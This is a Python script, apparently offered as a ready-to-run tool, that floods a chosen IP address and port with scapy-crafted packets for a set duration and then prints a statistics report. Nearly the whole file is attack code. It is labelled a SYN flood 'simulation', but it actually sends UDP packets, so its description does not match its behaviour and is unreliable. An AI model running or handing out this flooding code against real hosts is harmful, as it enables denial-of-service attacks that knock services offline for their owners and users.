import time
import threading
import pandas as pd
from scapy.all import send, IP, UDP
import numpy as np
from datetime import datetime

# Initialize attack parameters
attack_data = {
    "target_ip": None,
    "target_port": None,
    "start_time": None,
    "packets_sent": 0,
    "response_times": []
}

# Example SYN Flood Attack Simulation with logging
def simulate_syn_flood(target_ip, target_port, duration, log_interval=1):
    global attack_data
    attack_data["target_ip"] = target_ip
    attack_data["target_port"] = target_port
    attack_data["start_time"] = datetime.now()
    
    end_time = time.time() + duration
    print(f"Starting SYN Flood attack on {target_ip}:{target_port} for {duration} seconds.")
    
    while time.time() < end_time:
        packet = IP(dst=target_ip) / UDP(dport=target_port)
        start_time = time.time()
        send(packet, verbose=False)
        attack_data["packets_sent"] += 1
        attack_data["response_times"].append(time.time() - start_time)

        # Log statistics every `log_interval` seconds
        if (time.time() - attack_data["start_time"].timestamp()) % log_interval < 1:
            log_attack_status()

    print("Attack simulation finished.")
    generate_attack_report()

def log_attack_status():
    print(f"Packets sent: {attack_data['packets_sent']} | Target: {attack_data['target_ip']}:{attack_data['target_port']}")

def generate_attack_report():
    end_time = datetime.now()
    duration = (end_time - attack_data["start_time"]).total_seconds()
    avg_response_time = np.mean(attack_data["response_times"]) if attack_data["response_times"] else 0

    report = {
        "target_ip": attack_data["target_ip"],
        "target_port": attack_data["target_port"],
        "start_time": attack_data["start_time"],
        "end_time": end_time,
        "duration": duration,
        "packets_sent": attack_data["packets_sent"],
        "avg_response_time": avg_response_time
    }

    # Convert report to DataFrame for better readability (could save to CSV or DB)
    df = pd.DataFrame([report])
    print("\nAttack Report:")
    print(df)

if __name__ == "__main__":
    target_ip = '192.168.1.1'  # Change as necessary
    target_port = 80  # Change as necessary
    attack_duration = 10  # Duration of the attack in seconds

    # Run the attack in a separate thread to avoid blocking
    attack_thread = threading.Thread(target=simulate_syn_flood, args=(target_ip, target_port, attack_duration))
    attack_thread.start()
    attack_thread.join()  # Wait for the attack to finish
